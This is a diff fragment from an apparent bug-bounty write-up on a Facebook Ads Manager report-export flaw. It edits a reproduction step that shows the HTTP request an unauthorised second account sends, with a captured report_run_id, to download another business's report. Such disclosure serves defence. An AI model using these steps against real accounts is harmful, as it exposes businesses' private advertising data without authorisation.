@@ -25,7 +25,7 @@ Using the Graph API or report download endpoints, an attacker could export Ads M
 3. Open Inspector (DevTools) and observe the network requests/responses; when clicking Export report, the response contains `report_run_id` (a 16‑digit numeric ID).  
 4. As a second account (not admin/employee of the victim business), load the direct download endpoint:
    ```http
-   POST /ads/report_builder/export/download_report/?report_run_id={ID_report}&scope=business_account HTTP/1.1
+   GET /ads/report_builder/export/download_report/?report_run_id={ID_report}&scope=business_account HTTP/1.1
    Host: www.facebook.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
    Accept: */*
